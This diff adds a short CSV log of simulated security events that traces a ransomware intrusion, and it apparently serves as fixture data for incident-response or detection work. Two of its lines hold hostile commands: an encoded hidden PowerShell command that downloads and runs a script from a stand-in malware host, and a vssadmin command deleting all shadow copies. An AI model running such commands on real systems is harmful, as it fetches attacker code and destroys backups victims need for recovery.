@@ -1,0 +1,9 @@
+timestamp,source,event,severity
+04:12,Firewall,Suspicious external IP connection from 185.220.101.4 (Tor exit node),Medium
+04:15,Active Directory,Multiple failed LDAP authentication attempts for administrator account,High
+04:16,Active Directory,Successful login for administrator from workstation 192.168.1.15,Medium
+04:18,Windows Defender,Mimikatz credential dumper executed in LSASS process memory,Critical
+04:22,PowerShell,Encoded command run: powershell.exe -nop -w hidden -e aWVYKElud29rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHA6Ly9tYWx3YXJlLmRvbWFpbi9wYXlsb2FkLnBzMSIp,Critical
+04:25,Process Monitor,vssadmin.exe delete shadows /all /quiet spawned by powershell.exe,Critical
+04:28,File System,High-frequency file modification: .locked extension appended to 450 documents,Critical
+04:30,Desktop,Ransom note README_FOR_DECRYPT.txt created on Administrator desktop,Critical
